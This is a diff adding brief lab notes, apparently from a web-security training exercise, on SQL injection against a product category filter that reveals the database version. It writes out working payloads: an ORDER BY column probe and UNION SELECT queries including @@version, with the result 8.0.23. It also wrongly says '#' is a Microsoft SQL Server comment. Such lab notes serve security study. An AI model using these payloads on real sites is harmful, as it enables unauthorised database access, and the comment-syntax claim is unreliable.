@@ -1,0 +1,24 @@
+Lab #8 SQLi attack, querying the database type and version on MySQL & Microsoft
+
+SQL Injection - Product Category
+
+End Goal display the database version
+---------------------------------------------------------------
+
+Steps:
+
+1. Determine the number of columns.
+    use order by clause.
+
+' order by 3#   => # is used in Microsoft database to comment      => Internal server Error
+
+columns = 2
+
+2. Determine the data types of the columns.
+
+' UNION select 'a', 'a'#    => 200OK
+' UNION select @@version, NULL# 
+   
+    8.0.23
+
+
